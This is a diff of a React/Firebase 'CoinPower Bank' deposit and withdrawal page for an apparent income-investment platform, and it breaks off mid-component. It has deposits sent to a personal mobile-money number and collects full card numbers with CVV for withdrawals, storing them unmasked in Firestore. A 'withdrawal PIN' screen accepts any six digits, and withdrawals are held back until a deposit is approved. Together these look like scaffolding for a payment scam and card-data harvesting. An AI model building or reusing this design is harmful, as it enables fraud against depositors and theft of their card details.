@@ -1,65 +1,272 @@
 'use client';
 
-import { useState } from 'react';
-import { useForm } from 'react-hook-form';
-import { zodResolver } from '@hookform/resolvers/zod';
-import * as z from 'zod';
-import { collection, serverTimestamp, doc } from 'firebase/firestore';
+import { useState, useEffect, useRef } from "react";
+import { useRouter } from 'next/navigation';
+import {
+  Landmark, ArrowDownToLine, ArrowUpFromLine, Wallet, Shield, Clock,
+  CheckCircle, Copy, CreditCard, Smartphone, Coins, AlertCircle,
+  PartyPopper, PhoneCall, Hash, Network, User, MapPin, CalendarDays,
+  Hourglass, Info, Globe, ChevronLeft, Lock, KeyRound, ShieldCheck, X
+} from "lucide-react";
+import { SiTelegram } from "react-icons/si";
+import {
+  collection,
+  serverTimestamp,
+  doc,
+  Timestamp,
+  query,
+  orderBy,
+  limit,
+} from 'firebase/firestore';
 
-import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
-import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
-import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
-import { Input } from '@/components/ui/input';
-import { Button } from '@/components/ui/button';
-import { useToast } from '@/hooks/use-toast';
-import { useFirebase, useUser } from '@/firebase';
+import { Skeleton } from "@/components/ui/skeleton";
+import { Badge } from "@/components/ui/badge";
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
+import { Button } from "@/components/ui/button";
+import { Input } from "@/components/ui/input";
+import { useToast } from "@/hooks/use-toast";
+import { useFirebase, useUser, useCollection, useMemoFirebase } from '@/firebase';
 import { useUserStore } from '@/hooks/use-user-store';
 import { addDocumentNonBlocking, updateDocumentNonBlocking } from '@/firebase/non-blocking-updates';
-import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
-import { Info } from 'lucide-react';
+import { countries as COUNTRIES_DATA } from "@/lib/data";
+import { PlaceHolderImages } from "@/lib/placeholder-images";
+import { AlertDialog, AlertDialogAction, AlertDialogCancel, AlertDialogContent, AlertDialogDescription, AlertDialogFooter, AlertDialogHeader, AlertDialogTitle } from "@/components/ui/alert-dialog";
 
-const depositSchema = z.object({
-  amount: z.coerce.number().positive({ message: 'Please enter a valid amount.' }),
-  txId: z.string().min(4, { message: 'Please enter a valid Transaction ID.' }),
-});
+const COUNTRIES = COUNTRIES_DATA.map(c => c.value);
 
-const withdrawalSchema = z.object({
-  amount: z.coerce.number().positive({ message: 'Please enter a valid amount.' }),
-  momoNumber: z.string().min(10, { message: 'Please enter a valid MoMo number.' }),
-});
+const TELEGRAM_GROUP = "https://t.me/coinpow_group";
 
-const WITHDRAWAL_FEE_PERCENTAGE = 0.15;
+// Card validation helpers
+function luhnCheck(num: string): boolean {
+  const digits = num.replace(/\D/g, "");
+  if (digits.length < 13) return false;
+  let sum = 0;
+  let shouldDouble = false;
+  for (let i = digits.length - 1; i >= 0; i--) {
+    let d = parseInt(digits[i]);
+    if (shouldDouble) { d *= 2; if (d > 9) d -= 9; }
+    sum += d;
+    shouldDouble = !shouldDouble;
+  }
+  return sum % 10 === 0;
+}
+function isCardExpired(expiry: string): boolean {
+  const [mm, yy] = expiry.split("/");
+  if (!mm || !yy) return true;
+  const expDate = new Date(2000 + parseInt(yy), parseInt(mm) - 1, 1);
+  const now = new Date();
+  return expDate < new Date(now.getFullYear(), now.getMonth(), 1);
+}
+
+const DEPOSIT_PHONE = "+233592682060";
+const DEPOSIT_NAME = "M.F";
+const COUNTDOWN_SECONDS = 5 * 60;
+
+type WithdrawRecord = {
+  id: string;
+  userId: string;
+  username: string;
+  fullName: string;
+  country: string;
+  method: string;
+  amount: number;
+  netAmount: number;
+  fee: number;
+  details: string;
+  status: "pending" | "approved" | "rejected";
+  createdAt: Timestamp;
+};
+
+type DepositRecord = {
+  id: string;
+  amount: number;
+  txId: string;
+  date: string;
+  status: "pending" | "approved" | "rejected";
+  createdAt: Timestamp;
+};
+
+const imageMap = {
+  momo: PlaceHolderImages.find(i => i.id === 'mtn-momo')?.imageUrl,
+  usdt: PlaceHolderImages.find(i => i.id === 'usdt')?.imageUrl,
+  card: PlaceHolderImages.find(i => i.id === 'visa-mastercard')?.imageUrl,
+  telecel: PlaceHolderImages.find(i => i.id === 'telecel')?.imageUrl,
+  tigo: PlaceHolderImages.find(i => i.id === 'tigo')?.imageUrl,
+};
+
+const depositMethods = [
+  { id: "momo", label: "MTN MOMO", icon: Smartphone, img: imageMap.momo, desc: "Mobile Money", color: "from-yellow-400 to-amber-500" },
+  { id: "telecel", label: "TELECEL", icon: Smartphone, img: imageMap.telecel, desc: "Telecel Cash", color: "from-red-500 to-red-600" },
+  { id: "usdt", label: "USDT", icon: Coins, img: imageMap.usdt, desc: "Tether (TRC20/ERC20)", color: "from-teal-400 to-green-500" },
+  { id: "card", label: "CARD", icon: CreditCard, img: imageMap.card, desc: "Visa / Mastercard", color: "from-blue-400 to-indigo-500" },
+];
+
+const withdrawMethods = [
+  { id: "usdt", label: "USDT", icon: Coins, img: imageMap.usdt, desc: "Tether (TRC20/ERC20)", color: "from-teal-400 to-green-500" },
+  { id: "momo", label: "MTN MOMO", icon: Smartphone, img: imageMap.momo, desc: "Mobile Money", color: "from-yellow-400 to-amber-500" },
+  { id: "tigo", label: "TIGO", icon: Smartphone, img: imageMap.tigo, desc: "AirtelTigo Cash", color: "from-blue-600 to-red-600" },
+  { id: "card", label: "CARD", icon: CreditCard, img: imageMap.card, desc: "Visa / Mastercard", color: "from-blue-400 to-indigo-500" },
+];
+
+type Mode = "deposit" | "withdraw" | null;
+
+function useCountdown(active: boolean) {
+  const [seconds, setSeconds] = useState(COUNTDOWN_SECONDS);
+  const ref = useRef<ReturnType<typeof setInterval> | null>(null);
+  useEffect(() => {
+    if (active) {
+      setSeconds(COUNTDOWN_SECONDS);
+      ref.current = setInterval(() => setSeconds((s) => (s > 0 ? s - 1 : 0)), 1000);
+    } else {
+      if (ref.current) clearInterval(ref.current);
+    }
+    return () => { if (ref.current) clearInterval(ref.current); };
+  }, [active]);
+  const mins = String(Math.floor(seconds / 60)).padStart(2, "0");
+  const secs = String(seconds % 60).padStart(2, "0");
+  return { display: `${mins}:${secs}`, expired: seconds === 0 };
+}
+
+function genTxId() {
+  return "TXN" + Math.floor(100000 + Math.random() * 900000);
+}
+
+function PinBoxes({ value, onChange, testId }: { value: string; onChange: (v: string) => void; testId: string }) {
+  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
+  const digits = value.split("").concat(Array(6).fill("")).slice(0, 6);
+
+  const handleChange = (i: number, v: string) => {
+    const ch = v.replace(/\D/g, "").slice(-1);
+    const d = [...digits]; d[i] = ch;
+    onChange(d.join("").replace(/\s/g, ""));
+    if (ch && i < 5) inputRefs.current[i + 1]?.focus();
+  };
+
+  const handleKeyDown = (i: number, e: React.KeyboardEvent<HTMLInputElement>) => {
+    if (e.key === "Backspace") {
+      if (digits[i]) {
+        const d = [...digits]; d[i] = ""; onChange(d.join("").replace(/\s/g, ""));
+      } else if (i > 0) {
+        inputRefs.current[i - 1]?.focus();
+        const d = [...digits]; d[i - 1] = ""; onChange(d.join("").replace(/\s/g, ""));
+      }
+    } else if (e.key === "ArrowLeft" && i > 0) {
+      inputRefs.current[i - 1]?.focus();
+    } else if (e.key === "ArrowRight" && i < 5) {
+      inputRefs.current[i + 1]?.focus();
+    }
+  };
+
+  return (
+    <div className="flex gap-2 justify-center">
+      {digits.map((digit, i) => (
+        <input key={i}
+          ref={(el) => { inputRefs.current[i] = el; }}
+          type="password" inputMode="numeric" maxLength={1}
+          value={digit} onChange={(e) => handleChange(i, e.target.value)}
+          onKeyDown={(e) => handleKeyDown(i, e)}
+          onFocus={(e) => e.target.select()}
+          data-testid={`${testId}-${i}`}
+          className={`w-11 h-12 text-center text-xl font-bold rounded-xl border-2 bg-white shadow-sm transition-colors focus:outline-none ${digit ? "border-amber-400 text-amber-600" : "border-gray-200 text-gray-400"} focus:border-amber-500 focus:ring-2 focus:ring-amber-200`}
+        />
+      ))}
+    </div>
+  );
+}
 
 export default function BankPage() {
-  const { firestore, user } = useFirebase();
-  const { balance, username, fullName, country } = useUserStore();
+  const router = useRouter();
   const { toast } = useToast();
-  const [activeTab, setActiveTab] = useState('deposit');
+  const { firestore, user, isUserLoading } = useFirebase();
+  const userProfile = useUserStore();
+  
+  const [mode, setMode] = useState<Mode>(null);
+  const [showMomoPopup, setShowMomoPopup] = useState(false);
+  const [amount, setAmount] = useState("");
+  const [depositTxId, setDepositTxId] = useState("");
+  const [depositMethod, setDepositMethod] = useState<string | null>(null);
+  const [depositCountry, setDepositCountry] = useState("");
+  const [withdrawMethod, setWithdrawMethod] = useState<string | null>(null);
+  const [depositSuccess, setDepositSuccess] = useState(false);
+  const [withdrawSuccess, setWithdrawSuccess] = useState(false);
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const [lastTxId, setLastTxId] = useState("");
+  const [historyTab, setHistoryTab] = useState<"all" | "deposit" | "withdraw">("all");
 
-  const depositForm = useForm<z.infer<typeof depositSchema>>({
-    resolver: zodResolver(depositSchema),
-    defaultValues: { amount: 0, txId: '' },
-  });
+  const [usdt, setUsdt] = useState({ address: "", network: "TRC20", txId: "" });
+  const [momo, setMomo] = useState({ phone: "", name: "", txId: "" });
+  const [telecel, setTelecel] = useState({ phone: "", name: "", txId: "" });
+  const [tigo, setTigo] = useState({ phone: "", name: "", txId: "" });
+  const [card, setCard] = useState({ number: "", holder: "", expiry: "", cvv: "", cvvVisible: false });
+  const [depositCard, setDepositCard] = useState({ number: "", holder: "", expiry: "", cvv: "", cvvVisible: false });
 
-  const withdrawalForm = useForm<z.infer<typeof withdrawalSchema>>({
-    resolver: zodResolver(withdrawalSchema),
-    defaultValues: { amount: 0, momoNumber: '' },
-  });
+  const [pinMode, setPinMode] = useState<"security" | "setup" | "verify" | null>(null);
+  const [pinInput, setPinInput] = useState("");
+  const [pinConfirm, setPinConfirm] = useState("");
+  const [pinError, setPinError] = useState("");
 
-  const withdrawalAmount = withdrawalForm.watch('amount');
-  const withdrawalFee = withdrawalAmount * WITHDRAWAL_FEE_PERCENTAGE;
-  const netWithdrawal = withdrawalAmount - withdrawalFee;
+  const depositsRef = useMemoFirebase(() => {
+    if (!firestore || !user) return null;
+    return query(collection(firestore, 'users', user.uid, 'depositRequests'), orderBy('createdAt', 'desc'), limit(50));
+  }, [firestore, user]);
+  const { data: depositRecords = [] } = useCollection<DepositRecord>(depositsRef);
 
-  function handleDepositSubmit(values: z.infer<typeof depositSchema>) {
-    if (!firestore || !user) return;
+  const withdrawalsRef = useMemoFirebase(() => {
+    if (!firestore || !user) return null;
+    return query(collection(firestore, 'users', user.uid, 'withdrawalRequests'), orderBy('createdAt', 'desc'), limit(50));
+  }, [firestore, user]);
+  const { data: withdrawRecords = [] } = useCollection<WithdrawRecord>(withdrawalsRef);
 
+  const { display: countdown, expired } = useCountdown(mode === "deposit");
+
+  const copy = (text: string, label: string) =>
+    navigator.clipboard.writeText(text).then(() => toast({ title: `${label} copied!`, description: text }));
+
+  const openMode = (m: Mode) => {
+    setMode(m); setAmount("");
+    setDepositMethod(null);
+    setDepositCountry(userProfile.country || "");
+    setDepositSuccess(false); setWithdrawSuccess(false);
+    setWithdrawMethod(null); setLastTxId("");
+    setUsdt({ address: "", network: "TRC20", txId: "" });
+    setMomo({ phone: "", name: "", txId: "" });
+    setCard({ number: "", holder: "", expiry: "", cvv: "", cvvVisible: false });
+    setDepositCard({ number: "", holder: "", expiry: "", cvv: "", cvvVisible: false });
+  };
+
+  const handleDepositSubmit = async () => {
+    if (!user || !firestore) return;
+    if (!depositMethod) { toast({ title: "Select a payment method", variant: "destructive" }); return; }
+    if (!depositCountry) { toast({ title: "Select your country", variant: "destructive" }); return; }
+    if (!amount || parseFloat(amount) <= 0) { toast({ title: "Enter an amount", variant: "destructive" }); return; }
+    if (depositMethod === "card") {
+      const rawNum = depositCard.number.replace(/\s/g, "");
+      if (rawNum.length < 13 || !luhnCheck(rawNum)) { toast({ title: "Invalid card number", description: "Please check and enter a valid Visa or Mastercard number.", variant: "destructive" }); return; }
+      if (!depositCard.holder.trim()) { toast({ title: "Enter the cardholder name", variant: "destructive" }); return; }
+      if (!depositCard.expiry || depositCard.expiry.length < 5) { toast({ title: "Enter a valid expiry date (MM/YY)", variant: "destructive" }); return; }
+      if (isCardExpired(depositCard.expiry)) { toast({ title: "Card has expired", description: "This card's expiry date has passed. Please use a valid card.", variant: "destructive" }); return; }
+      if (!depositCard.cvv || depositCard.cvv.length < 3) { toast({ title: "Enter the CVV code", variant: "destructive" }); return; }
+      const last4 = rawNum.slice(-4);
+      const autoTxId = `CARD-${last4}-${depositCard.holder.trim().toUpperCase().replace(/\s+/g, "-")}`;
+      if (!depositTxId.trim()) setDepositTxId(autoTxId);
+    } else {
+      if (!depositTxId.trim()) { toast({ title: "Enter your transaction ID", variant: "destructive" }); return; }
+    }
+    setIsSubmitting(true);
+    const methodLabel = depositMethods.find(m => m.id === depositMethod)?.label || depositMethod;
+    const rawNum = depositCard.number.replace(/\s/g, "");
+    const cardRef = depositMethod === "card"
+      ? `CARD-****${rawNum.slice(-4)} ${depositCard.holder.trim()} ${depositCard.expiry}`
+      : depositTxId.trim();
+    const enrichedTxId = `[${methodLabel}|${depositCountry}] ${cardRef || depositTxId.trim()}`;
+    
     const depositRequestsRef = collection(firestore, 'users', user.uid, 'depositRequests');
     const newDeposit = {
       userId: user.uid,
-      username,
-      fullName,
-      amount: values.amount,
-      txId: values.txId,
+      username: userProfile.username,
+      fullName: userProfile.fullName,
+      amount: parseFloat(amount),
+      txId: enrichedTxId,
       date: new Date().toLocaleDateString(),
       status: 'pending',
       createdAt: serverTimestamp(),
@@ -67,187 +274,607 @@ export default function BankPage() {
 
     addDocumentNonBlocking(depositRequestsRef, newDeposit);
 
-    toast({
-      title: 'Deposit Request Submitted',
-      description: 'Your deposit is being reviewed and will be credited upon approval.',
-    });
-    depositForm.reset();
-  }
+    setDepositSuccess(true);
+    setDepositTxId("");
+    setIsSubmitting(false);
+  };
 
-  function handleWithdrawalSubmit(values: z.infer<typeof withdrawalSchema>) {
-    if (!firestore || !user) return;
-
-    const totalWithdrawalCost = values.amount; // User enters gross amount
-    if (totalWithdrawalCost > balance) {
-      withdrawalForm.setError('amount', {
-        type: 'manual',
-        message: "You don't have enough funds for this withdrawal.",
-      });
+  const handleWithdrawalSubmit = async () => {
+    if (!user || !firestore) return;
+    if (!amount || parseFloat(amount) <= 0) { toast({ title: "Enter an amount", variant: "destructive" }); return; }
+    if (!withdrawMethod) { toast({ title: "Select a payment method", variant: "destructive" }); return; }
+    const amt = parseFloat(amount);
+    
+    if (amt > userProfile.balance) {
+      toast({ title: "Insufficient balance", description: `Your balance is $${userProfile.balance.toFixed(2)}`, variant: "destructive" });
       return;
     }
+    if (withdrawMethod === "card") {
+      const rawNum = card.number.replace(/\s/g, "");
+      if (rawNum.length < 13 || !luhnCheck(rawNum)) { toast({ title: "Invalid card number", description: "Please check and enter a valid Visa or Mastercard number.", variant: "destructive" }); return; }
+      if (!card.holder.trim()) { toast({ title: "Enter the cardholder name", variant: "destructive" }); return; }
+      if (!card.expiry || card.expiry.length < 5) { toast({ title: "Enter a valid expiry date (MM/YY)", variant: "destructive" }); return; }
+      if (isCardExpired(card.expiry)) { toast({ title: "Card has expired", description: "This card's expiry date has passed. Please use a valid card.", variant: "destructive" }); return; }
+      if (!card.cvv || card.cvv.length < 3) { toast({ title: "Enter the CVV code", variant: "destructive" }); return; }
+    }
+    const txId = genTxId();
+    setIsSubmitting(true);
+    try {
+      const details = withdrawMethod === "usdt" ? usdt : withdrawMethod === "momo" ? momo : withdrawMethod === "tigo" ? tigo : card;
+      
+      const withdrawalRequestsRef = collection(firestore, 'users', user.uid, 'withdrawalRequests');
+      const newWithdrawal = {
+          userId: user.uid,
+          username: userProfile.username,
+          fullName: userProfile.fullName,
+          country: userProfile.country,
+          method: withdrawMethods.find(m => m.id === withdrawMethod)?.label || withdrawMethod,
+          amount: amt,
+          netAmount: amt - (amt * 0.15), // Assuming 15% fee
+          fee: amt * 0.15,
+          details: JSON.stringify(details),
+          status: 'pending',
+          createdAt: serverTimestamp(),
+      };
+      
+      const userRef = doc(firestore, 'users', user.uid);
+      updateDocumentNonBlocking(userRef, { balance: userProfile.balance - amt });
+      addDocumentNonBlocking(withdrawalRequestsRef, newWithdrawal);
 
-    const withdrawalRequestsRef = collection(firestore, 'users', user.uid, 'withdrawalRequests');
-    const newWithdrawal = {
-      userId: user.uid,
-      username,
-      fullName,
-      country,
-      method: 'MTN Mobile Money',
-      amount: values.amount,
-      netAmount: netWithdrawal,
-      fee: withdrawalFee,
-      details: values.momoNumber,
-      status: 'pending',
-      createdAt: serverTimestamp(),
-    };
-    
-    const userRef = doc(firestore, 'users', user.uid);
-    updateDocumentNonBlocking(userRef, { balance: balance - totalWithdrawalCost });
-    addDocumentNonBlocking(withdrawalRequestsRef, newWithdrawal);
+      setWithdrawSuccess(true);
+      setLastTxId(txId);
+    } catch (err: any) {
+      toast({ title: "Withdrawal failed", description: err.message, variant: "destructive" });
+    } finally {
+      setIsSubmitting(false);
+    }
+  };
 
-    toast({
-      title: 'Withdrawal Request Submitted',
-      description: 'Your request is being processed.',
-    });
-    withdrawalForm.reset();
-  }
+  if (isUserLoading) return <div className="pt-12 p-4 pb-20 max-w-4xl mx-auto"><Skeleton className="h-64 rounded-2xl" /></div>;
+  if (!user) { router.push("/signin"); return null; }
+
+  const selectedMethodLabel = withdrawMethods.find(m => m.id === withdrawMethod)?.label || "";
+  const hasApprovedDeposit = (depositRecords as any[]).some((d) => d.status === "approved");
 
   return (
-    <div className="flex flex-col gap-6">
-      <h1 className="text-3xl font-bold tracking-tight">Bank</h1>
-      
-      <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
-        <TabsList className="grid w-full grid-cols-2">
-          <TabsTrigger value="deposit">Deposit</TabsTrigger>
-          <TabsTrigger value="withdraw">Withdraw</TabsTrigger>
-        </TabsList>
-        <TabsContent value="deposit">
-          <Card>
-            <CardHeader>
-              <CardTitle>Make a Deposit</CardTitle>
-              <CardDescription>
-                Follow the steps below to add funds to your CoinPower account.
-              </CardDescription>
-            </CardHeader>
-            <CardContent className="space-y-4">
-              <Alert className="bg-primary/10 border-primary/20">
-                <Info className="h-4 w-4 text-primary" />
-                <AlertTitle className="text-primary">Deposit Instructions</AlertTitle>
-                <AlertDescription className="text-foreground/80">
-                  Send your deposit via <strong className="font-semibold">MTN Mobile Money</strong> to:
-                  <ul className="list-disc pl-5 mt-2">
-                    <li>Name: <strong>James Cole</strong></li>
-                    <li>Number: <strong>+233257758007</strong></li>
-                  </ul>
-                </AlertDescription>
-              </Alert>
+    <div className="pt-12 pb-20 min-h-screen bg-[#f7f9f4]">
+      {pinMode && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm px-4">
+          <div className="bg-white rounded-3xl shadow-2xl w-full max-w-sm p-6 relative">
+            <button onClick={() => { setPinMode(null); setPinInput(""); setPinConfirm(""); setPinError(""); }}
+              className="absolute top-4 right-4 text-gray-400 hover:text-gray-600 transition-colors" data-testid="button-close-pin">
+              <X className="w-5 h-5" />
+            </button>
+            {pinMode === "verify" && (
+              <div className="flex flex-col items-center text-center gap-4">
+                <div className="w-14 h-14 rounded-2xl bg-gradient-to-br from-amber-400 to-amber-600 flex items-center justify-center shadow-lg">
+                  <Lock className="w-7 h-7 text-white" />
+                </div>
+                <div>
+                  <h2 className="text-xl font-bold text-gray-900">Enter Withdrawal PIN</h2>
+                  <p className="text-gray-500 text-sm mt-1">Enter your 6-digit PIN to continue</p>
+                </div>
+                <div className="w-full">
+                  <PinBoxes value={pinInput} onChange={setPinInput} testId="pin-verify" />
+                  {pinError && <p className="text-red-500 text-xs font-medium mt-2">{pinError}</p>}
+                </div>
+                <Button data-testid="button-verify-pin"
+                  disabled={pinInput.length < 6}
+                  onClick={() => {
+                    if (pinInput.length < 6) { setPinError("Enter all 6 digits"); return; }
+                    setPinError("");
+                    setPinMode(null);
+                    setMode("withdraw");
+                    setAmount(""); setWithdrawMethod(null); setWithdrawSuccess(false);
+                    setUsdt({ address: "", network: "TRC20", txId: "" });
+                    setMomo({ phone: "", name: "", txId: "" });
+                    setCard({ number: "", holder: "", expiry: "", cvv: "", cvvVisible: false });
+                  }}
+                  className="w-full bg-gradient-to-r from-amber-400 to-amber-600 text-white font-bold rounded-xl h-12 text-base shadow-md disabled:opacity-50">
+                  Unlock Withdrawal
+                </Button>
+              </div>
+            )}
+          </div>
+        </div>
+      )}
 
-              <p className="text-sm text-muted-foreground pt-4">
-                After sending the money, fill out the form below with the exact amount and transaction ID from your MoMo receipt. Your account will be credited once the deposit is confirmed.
-              </p>
+      <AlertDialog open={showMomoPopup} onOpenChange={setShowMomoPopup}>
+          <AlertDialogContent>
+              <AlertDialogHeader>
+                  <AlertDialogTitle>Deposit via MTN Mobile Money</AlertDialogTitle>
+                  <AlertDialogDescription>
+                      Send your deposit to the number below, then click "I've Paid" to proceed to the next step.
+                  </AlertDialogDescription>
+              </AlertDialogHeader>
+              <div className="bg-yellow-50 rounded-xl border border-yellow-200 p-4 space-y-3">
+                  <div className="flex items-center justify-between gap-3 bg-white rounded-lg px-3 py-2.5 border border-yellow-100">
+                      <div>
+                          <p className="text-xs text-gray-400">Account Name</p>
+                          <p className="font-bold text-gray-900 text-sm sm:text-base">{DEPOSIT_NAME}</p>
+                      </div>
+                      <button onClick={() => copy(DEPOSIT_NAME, "Name")} className="p-2 rounded-lg bg-amber-50 hover:bg-amber-100 transition-colors border border-amber-200">
+                          <Copy className="w-4 h-4 text-amber-600" />
+                      </button>
+                  </div>
+                  <div className="flex items-center justify-between gap-3 bg-white rounded-lg px-3 py-2.5 border border-yellow-100">
+                      <div>
+                          <p className="text-xs text-gray-400">MTN MOMO Number</p>
+                          <p className="font-bold text-gray-900 text-lg tracking-widest">{DEPOSIT_PHONE}</p>
+                      </div>
+                      <button onClick={() => copy(DEPOSIT_PHONE, "Phone number")} className="p-2 rounded-lg bg-amber-50 hover:bg-amber-100 transition-colors border border-amber-200">
+                          <Copy className="w-4 h-4 text-amber-600" />
+                      </button>
+                  </div>
+              </div>
+              <AlertDialogFooter>
+                  <AlertDialogCancel>Cancel</AlertDialogCancel>
+                  <AlertDialogAction onClick={() => { setShowMomoPopup(false); openMode('deposit'); }}>I've Paid, Next Step</AlertDialogAction>
+              </AlertDialogFooter>
+          </AlertDialogContent>
+      </AlertDialog>
 
-              <Form {...depositForm}>
-                <form onSubmit={depositForm.handleSubmit(handleDepositSubmit)} className="space-y-6">
-                  <FormField
-                    control={depositForm.control}
-                    name="amount"
-                    render={({ field }) => (
-                      <FormItem>
-                        <FormLabel>Amount (GHS)</FormLabel>
-                        <FormControl>
-                          <Input type="number" placeholder="e.g., 500" {...field} />
-                        </FormControl>
-                        <FormMessage />
-                      </FormItem>
-                    )}
-                  />
-                  <FormField
-                    control={depositForm.control}
-                    name="txId"
-                    render={({ field }) => (
-                      <FormItem>
-                        <FormLabel>Transaction ID</FormLabel>
-                        <FormControl>
-                          <Input placeholder="Enter the Transaction ID from your receipt" {...field} />
-                        </FormControl>
-                        <FormMessage />
-                      </FormItem>
-                    )}
-                  />
-                  <Button type="submit" className="w-full" disabled={depositForm.formState.isSubmitting}>
-                    {depositForm.formState.isSubmitting ? 'Submitting...' : 'Submit Deposit Request'}
-                  </Button>
-                </form>
-              </Form>
-            </CardContent>
-          </Card>
-        </TabsContent>
-        <TabsContent value="withdraw">
-          <Card>
-            <CardHeader>
-              <CardTitle>Withdraw Funds</CardTitle>
-              <CardDescription>
-                Request a withdrawal to your MTN Mobile Money account.
-              </CardDescription>
-            </CardHeader>
-            <CardContent className="space-y-4">
-              <Alert variant="destructive" className="bg-accent/10 border-accent/20">
-                <Info className="h-4 w-4 text-accent" />
-                <AlertTitle className="text-accent">Withdrawal Information</AlertTitle>
-                <AlertDescription className="text-foreground/80">
-                  A withdrawal fee of <strong className="font-semibold">{WITHDRAWAL_FEE_PERCENTAGE * 100}%</strong> will be applied to all transactions.
-                </AlertDescription>
-              </Alert>
-              
-              <Form {...withdrawalForm}>
-                <form onSubmit={withdrawalForm.handleSubmit(handleWithdrawalSubmit)} className="space-y-6">
-                  <FormField
-                    control={withdrawalForm.control}
-                    name="amount"
-                    render={({ field }) => (
-                      <FormItem>
-                        <FormLabel>Amount to Withdraw (GHS)</FormLabel>
-                        <FormControl>
-                          <Input type="number" placeholder="e.g., 100" {...field} />
-                        </FormControl>
-                        <FormMessage />
-                      </FormItem>
-                    )}
-                  />
-                  <FormField
-                    control={withdrawalForm.control}
-                    name="momoNumber"
-                    render={({ field }) => (
-                      <FormItem>
-                        <FormLabel>Your MTN MoMo Number</FormLabel>
-                        <FormControl>
-                          <Input placeholder="e.g., 0241234567" {...field} />
-                        </FormControl>
-                        <FormMessage />
-                      </FormItem>
-                    )}
-                  />
-                  <Card className="bg-muted/50">
-                    <CardContent className="p-4 space-y-2 text-sm">
-                      <div className="flex justify-between">
-                        <span>Withdrawal Fee:</span>
-                        <span className="font-medium">GHS {withdrawalFee.toFixed(2)}</span>
+      <div className="max-w-4xl mx-auto px-3 sm:px-6">
+
+        <div className="py-4 sm:py-5 mb-2">
+          <div className="flex items-center gap-3 mb-1">
+            <div className="w-9 h-9 rounded-xl bg-gradient-to-br from-amber-400 to-amber-600 flex items-center justify-center shadow-md">
+              <Landmark className="w-4 h-4 text-white" />
+            </div>
+            <h1 className="text-xl sm:text-2xl font-bold text-gray-900">CoinPower Bank</h1>
+          </div>
+          <p className="text-gray-500 text-xs sm:text-sm">Manage your deposits and withdrawals securely</p>
+        </div>
+
+        <div className="bg-gradient-to-r from-amber-500 via-amber-600 to-yellow-500 rounded-2xl p-5 sm:p-6 mb-4 shadow-xl text-white relative overflow-hidden">
+          <div className="absolute top-0 right-0 w-32 h-32 rounded-full bg-white/10 -translate-y-1/2 translate-x-1/2" />
+          <div className="relative z-10">
+            <div className="flex items-center gap-2 mb-1">
+              <Wallet className="w-4 h-4 text-amber-100" />
+              <p className="text-amber-100 text-xs font-medium">Available Balance</p>
+            </div>
+            <p className="text-3xl sm:text-4xl font-bold mt-1 mb-3" data-testid="text-balance">${userProfile.balance.toFixed(2)}</p>
+            <div className="flex flex-wrap items-center gap-3">
+              <div className="flex items-center gap-1.5"><Shield className="w-3.5 h-3.5 text-amber-200" /><span className="text-amber-100 text-xs">Protected Balance</span></div>
+              <div className="flex items-center gap-1.5"><CheckCircle className="w-3.5 h-3.5 text-amber-200" /><span className="text-amber-100 text-xs">Verified Account</span></div>
+            </div>
+          </div>
+        </div>
+
+        {(() => {
+          const today = new Date().getDay();
+          const isSunday = today === 0;
+          const days = ["Sun","Mon","Tue","Wed","Thu","Fri","Sat"];
+          return (
+            <div className={`rounded-2xl border-2 p-4 mb-4 ${isSunday ? "bg-red-50 border-red-300" : "bg-blue-50 border-blue-200"}`}>
+              <div className="flex items-start gap-3">
+                <div className={`w-9 h-9 rounded-xl flex items-center justify-center flex-shrink-0 shadow-sm ${isSunday ? "bg-red-500" : "bg-blue-500"}`}>
+                  <span className="text-white text-lg">📢</span>
+                </div>
+                <div className="flex-1">
+                  <p className={`font-bold text-sm mb-1 ${isSunday ? "text-red-800" : "text-blue-800"}`}>
+                    {isSunday ? "⚠️ Sunday — Withdrawals Closed Today" : "Withdrawal Processing Schedule"}
+                  </p>
+                  {isSunday ? (
+                    <p className="text-red-700 text-xs leading-relaxed">
+                      Today is <strong>Sunday</strong>. Withdrawal accounts are <strong>closed</strong> for processing. The platform remains active — you can still deposit, rent generators, and earn income as usual. Any withdrawal request submitted today will be <strong>reviewed and processed on Monday</strong> when accounts reopen.
+                    </p>
+                  ) : (
+                    <p className="text-blue-700 text-xs leading-relaxed">
+                      Withdrawals are processed <strong>Monday to Saturday</strong> within 1–24 hours. On <strong>Sundays</strong>, the platform is active but withdrawal accounts are closed — any request submitted on Sunday will be processed the following <strong>Monday</strong>.
+                    </p>
+                  )}
+                  <div className="flex gap-1.5 mt-3 flex-wrap">
+                    {days.map((d, i) => (
+                      <span key={d} className={`text-xs font-bold px-2 py-0.5 rounded-full ${
+                        i === 0
+                          ? "bg-red-200 text-red-700"
+                          : i === today
+                          ? "bg-green-500 text-white ring-2 ring-green-400 ring-offset-1"
+                          : "bg-white border border-blue-200 text-blue-600"
+                      }`}>
+                        {d}{i === 0 ? " ✕" : ""}
+                      </span>
+                    ))}
+                  </div>
+                </div>
+              </div>
+            </div>
+          );
+        })()}
+
+        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4 mb-4">
+          <button data-testid="button-deposit" onClick={() => setShowMomoPopup(true)}
+            className={`flex items-center gap-3 p-4 rounded-2xl border-2 transition-all duration-200 text-left w-full ${mode === "deposit" ? "border-green-500 bg-green-50 shadow-md" : "border-gray-200 bg-white hover:border-green-300 hover:bg-green-50/50"}`}>
+            <div className="w-11 h-11 rounded-xl overflow-hidden shadow-md flex-shrink-0">
+              <img src={imageMap.momo} alt="MTN MoMo" className="w-full h-full object-cover" />
+            </div>
+            <div className="flex-1">
+              <p className="font-bold text-gray-900 text-sm sm:text-base">Deposit Funds</p>
+              <p className="text-xs text-gray-500 mt-0.5">MTN MoMo · USDT · Card</p>
+              <p className="text-xs text-amber-600 font-medium mt-1">Tap to see payment details</p>
+            </div>
+            <ArrowDownToLine className="w-5 h-5 text-green-500 flex-shrink-0" />
+          </button>
+
+          <button data-testid="button-withdraw"
+            onClick={() => {
+              if (!hasApprovedDeposit) {
